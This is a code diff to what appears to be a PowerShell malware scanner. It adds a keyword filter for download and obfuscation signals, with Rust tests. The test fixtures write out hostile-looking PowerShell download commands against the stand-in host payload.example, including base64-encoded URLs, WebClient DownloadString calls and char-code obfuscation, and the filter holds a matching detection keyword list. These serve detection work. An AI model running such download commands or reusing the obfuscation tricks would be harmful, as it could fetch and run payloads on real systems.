@@ -3774,6 +3774,58 @@ mod herestring_iex_tests {
             );
         }
     }
+
+    #[test]
+    fn ps1_download_gate_allows_direct_and_alias_downloads() {
+        for text in [
+            "Invoke-WebRequest -Uri https://payload.example/a -OutFile a.exe",
+            "iwr payload.example/a -OutFile a.exe",
+            "curl.exe https://payload.example/a -o a.exe",
+            "Start-BitsTransfer -Source payload.example/a -Destination a.exe",
+            "mshta https://payload.example/a.hta",
+        ] {
+            assert!(ps1_payload_has_download_signal(text), "blocked: {text}");
+        }
+    }
+
+    #[test]
+    fn ps1_download_gate_allows_encoded_and_obfuscated_downloads() {
+        for text in [
+            "$x=[Convert]::FromBase64String('aHR0cHM6Ly9wYXlsb2FkLmV4YW1wbGUvYQ==')",
+            "[Text.Encoding]::UTF8.GetString($bytes)",
+            "[char]73+[char]110+[char]118+[char]111+[char]107+[char]101",
+            "$wc = New-Object Net.WebClient; $wc.DownloadString($u)",
+            ".('DownloadString').Invoke('https://payload.example/a')",
+            "CallByName($wc,'DownloadString','Get','https://payload.example/a')",
+        ] {
+            assert!(ps1_payload_has_download_signal(text), "blocked: {text}");
+        }
+    }
+
+    #[test]
+    fn ps1_download_gate_allows_corpus_string_index_decoder_shapes() {
+        for text in [
+            "Get-Service;$f='func';Get-History;$f+='t';$f+='ion:';(ni -p $f)",
+            "$x=${host}.Runspace;If ($x) {$n++;$s+='payload'}",
+            "spsv marker;function Decode($s){$out+=$s[$i]};Decode $blob",
+        ] {
+            assert!(ps1_payload_has_download_signal(text), "blocked: {text}");
+        }
+    }
+
+    #[test]
+    fn ps1_download_gate_blocks_benign_inventory_payloads() {
+        for text in [
+            "Get-CimInstance Win32_OperatingSystem | Select-Object Caption",
+            "$name = [System.Net.Dns]::GetHostName(); Write-Host $name",
+            "Start-Process notepad.exe",
+        ] {
+            assert!(
+                !ps1_payload_has_download_signal(text),
+                "allowed benign text: {text}"
+            );
+        }
+    }
 }
 
 /// Walk every entry in `env.all_extracted_ps1` looking for a one-shot
@@ -3892,6 +3944,9 @@ pub fn scan_ps1_payloads(env: &mut Environment) {
 
     for (idx, payload) in payloads.iter().enumerate() {
         let raw_owned = decode_payload(payload).into_owned();
+        if !ps1_payload_has_download_signal(&raw_owned) {
+            continue;
+        }
 
         let text_expanded = expand_obfuscation(&raw_owned);
         // Dual-scan: also run URL regexes over alias-expanded version so that
@@ -3999,6 +4054,53 @@ pub fn scan_ps1_payloads(env: &mut Environment) {
     }
     payloads.append(&mut env.all_extracted_ps1);
     env.all_extracted_ps1 = payloads;
+}
+
+fn ps1_payload_has_download_signal(text: &str) -> bool {
+    const ATOMS: &[&[u8]] = &[
+        b"http:",
+        b"https:",
+        b"ftp:",
+        b"file:",
+        b"invoke-webrequest",
+        b"invoke-restmethod",
+        b"iwr",
+        b"irm",
+        b"wget",
+        b"curl",
+        b"curl.exe",
+        b"mshta",
+        b"downloadstring",
+        b"downloadfile",
+        b"downloaddata",
+        b"start-bitstransfer",
+        b"webclient",
+        b"webrequest",
+        b"frombase64string",
+        b"getstring",
+        b"[char]",
+        b"callbyname",
+        b".invoke",
+        b"loadstring",
+        b"adstring",
+        b"get-history",
+        b"runspace",
+        b"function",
+    ];
+
+    ATOMS
+        .iter()
+        .any(|atom| contains_ascii_case_insensitive_bytes(text, atom))
+}
+
+fn contains_ascii_case_insensitive_bytes(text: &str, atom: &[u8]) -> bool {
+    !atom.is_empty()
+        && text.as_bytes().windows(atom.len()).any(|window| {
+            window
+                .iter()
+                .zip(atom)
+                .all(|(byte, atom_byte)| byte.eq_ignore_ascii_case(atom_byte))
+        })
 }
 
 fn ps_url_inside_non_download_hash_option(text: &str, url_start: usize) -> bool {
